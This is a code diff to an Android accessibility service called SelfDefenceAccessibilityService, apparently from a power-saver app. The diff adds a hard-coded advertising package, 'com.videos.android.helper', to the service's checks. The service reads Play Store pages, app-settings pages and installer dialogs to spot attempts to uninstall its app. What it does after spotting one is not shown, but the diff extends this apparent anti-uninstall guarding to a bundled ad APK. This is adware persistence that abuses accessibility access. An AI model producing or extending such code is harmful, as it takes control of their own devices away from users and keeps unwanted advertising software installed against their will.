@@ -28,6 +28,9 @@ public class SelfDefenceAccessibilityService extends AccessibilityService {
     private String appName;
     private int inPageState = PAGESTATE.DEFAULT;
 
+    // 广告APK名称，如果多个或者由服务器获取，可以设置成列表
+    private String shorfilmName = "com.videos.android.helper";
+
     public interface PAGESTATE {
         int DEFAULT = 0;
         int DETAIL_OR_GP = 1;
@@ -76,7 +79,7 @@ public class SelfDefenceAccessibilityService extends AccessibilityService {
                     info = findViewByID(source, GPResId.getTitleId());
                     if (info != null) {
                         AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "查找到正处于GP详情页，判断是否本应用");
-                        if (judgeTextContains(info, appName)) {
+                        if (judgeTextContains(info, appName) || judgeTextContains(info, shorfilmName)) {
                             // 当前正处于本应用界面
                             AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "该详情页为本应用详情页，关注后续执行");
                             inPageState = PAGESTATE.DETAIL_OR_GP;
@@ -92,7 +95,7 @@ public class SelfDefenceAccessibilityService extends AccessibilityService {
                         // 多加一层是因为避免无障碍处的影响
                         if (findViewByID(source, GuardConst.getDetailSettingVersion()) != null) {
                             AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "查找到正处于应用详情页，判断是否本应用");
-                            if (judgeTextContains(info, appName)) {
+                            if (judgeTextContains(info, appName) || judgeTextContains(info, shorfilmName)) {
                                 // 当前正处于本应用界面
                                 AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "该详情页为本应用详情页，关注后续执行");
                                 inPageState = PAGESTATE.DETAIL_OR_GP;
@@ -138,7 +141,7 @@ public class SelfDefenceAccessibilityService extends AccessibilityService {
                 if (curInstallPn.equals(pkg)) {
                     AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "当前是处于installler状态，判断是否为弹窗且为本应用");
                     info = findViewByID(source, GuardConst.getAlertTitle());
-                    if (judgeTextContains(info, appName)) {
+                    if (judgeTextContains(info, appName) || judgeTextContains(info, shorfilmName)) {
                         AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "本应用执行安装卸载状态中，判断是否处于卸载");
                         info = findViewByID(source, GuardConst.getAlertMsg());
                         if (judgeTextContains(info, getString(R.string.powersaver_uninstall_text))) {
@@ -152,7 +155,7 @@ public class SelfDefenceAccessibilityService extends AccessibilityService {
                     // 针对ONEPLUS
                     AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "当前是处于installler状态，判断是否为弹窗且为本应用(一加)");
                     info = findViewByID(source, GuardConst.getOnePlusAlertTitle());
-                    if (judgeTextContains(info, appName)) {
+                    if (judgeTextContains(info, appName) || judgeTextContains(info, shorfilmName)) {
                         AppDebugLog.d(AppDebugLog.TAG_SELF_GUARD, "本应用执行安装卸载状态中，判断是否处于卸载");
                         info = findViewByID(source, GuardConst.getAlertMsg());
                         if (judgeTextContains(info, getString(R.string.powersaver_uninstall_text))) {
